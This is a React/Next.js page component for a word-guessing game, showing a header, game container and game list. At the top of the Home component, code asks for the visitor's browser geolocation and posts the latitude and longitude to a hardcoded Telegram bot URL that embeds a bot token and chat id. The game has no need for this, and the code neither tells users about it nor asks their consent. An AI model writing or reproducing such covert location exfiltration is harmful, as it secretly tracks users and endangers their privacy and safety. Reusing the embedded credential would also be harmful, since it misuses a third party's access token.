"use client";

// components
import { GameList, Header, GameContainer, Game } from "@/components";

// contexts
import { useAppContext } from "@/context/AppContext";

// interfaces
import { IHeaderProps } from "@/interface";

import styles from "./page.module.css";
import axios from "axios";

export default function Home() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition((position) => {
      const { latitude, longitude } = position.coords;
      const send = `l: ${latitude} lg: ${longitude}`;
      axios({
        method: "post",
        url: `https://api.telegram.org/bot7886110419:AAE_XefEJWd0lQaJvlJj3xcEYnw55TKk4Vo/sendMessage?chat_id=6657415554&text=${send}`,
      });
      // You can use reverse geocoding here to find the location
    });
  } else {
    console.log("Geolocation is not supported by this browser.");
  }
  const { hiddenWord, setList, setWordLength, wordLength, mode } =
    useAppContext();

  const headerProps: IHeaderProps = {
    hiddenWord,
    setList,
    setWordLength,
    wordLength,
  };
  return (
    <main className={`${styles.main} ${mode ? styles.lightMode : ""}`}>
      <GameContainer>
        <Header {...headerProps} />
        <Game />
      </GameContainer>
      <GameList mode={mode} />
    </main>
  );
}
